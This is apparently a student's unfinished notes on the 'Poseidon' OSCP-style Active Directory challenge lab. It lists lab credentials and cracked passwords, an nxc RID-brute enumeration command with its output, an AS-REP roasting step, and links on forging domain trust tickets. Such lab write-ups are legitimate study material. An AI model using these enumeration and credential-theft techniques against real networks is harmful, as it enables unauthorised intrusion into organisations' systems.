# Poseidon

## Report

We have been tasked to conduct a penetration test on the network of _poseidon.xyz_. Several vulnerabilities and misconfigurations are present on the Active Directory environment, which can be leveraged by an attacker to gain access to all workstations. The main objective is obtain access to the Domain Controller.

The public subnet of the network resides in the `192.168.xx.0/24` range, where the `xx` of the third octet can be found under the _IP ADDRESS_ field in the control panel.

Although this Challenge Lab is not a mock exam, it has been setup to use the 'Assumed Breach' scenario as seen in the OSCP+ exam. The credentials below can be used to commence your attack: Username: Eric.Wallows Password: EricLikesRunning800



IP=192.168.45.237 \[ours]

## Domain Users

`Eric.Wallows:EricLikesRunning800`

### DC01 (poseidon.yzx)

### DC02 (sub.poseidon.yzx)



<pre><code>chen:freedom
<strong>lisa:LisaWayToGo456
</strong></code></pre>

## Chain Attack Flow

```
.162 - Enumerate userlist from initial creds and asreproast for 'chen' who has winrm access for .163

```

## Flags

```
163 - local.txt
```

## Enumeration \[Not Machine Specific]

```
nxc smb 192.168.225.161-163 -u Eric.Wallows -p 'EricLikesRunning800' --rid-brute
SMB         192.168.225.162 445    DC02             [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC02) (domain:sub.poseidon.yzx) (signing:True) (SMBv1:True) 
SMB         192.168.225.163 445    GYOZA            [*] Windows 10 / Server 2019 Build 19041 x64 (name:GYOZA) (domain:sub.poseidon.yzx) (signing:False) (SMBv1:False)                                                                                                                                                                 
SMB         192.168.225.161 445    DC01             [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC01) (domain:poseidon.yzx) (signing:True) (SMBv1:True) 
SMB         192.168.225.162 445    DC02             [+] sub.poseidon.yzx\Eric.Wallows:EricLikesRunning800 
SMB         192.168.225.163 445    GYOZA            [+] sub.poseidon.yzx\Eric.Wallows:EricLikesRunning800 
SMB         192.168.225.161 445    DC01             [-] poseidon.yzx\Eric.Wallows:EricLikesRunning800 STATUS_LOGON_FAILURE 
```

## Learn

* nxc shows winrm not possible but it actually is what???
* domain sids and 'Enterprise Admins' running the entire forest (519)

{% embed url="https://redfoxsec.com/blog/domain-trusts-exploitation-playbook/" %}

{% embed url="https://medium.com/r3d-buck3t/breaking-domain-trusts-with-forged-trust-tickets-5f03fb71cd72" %}
incase you really want to access via ptt
{% endembed %}
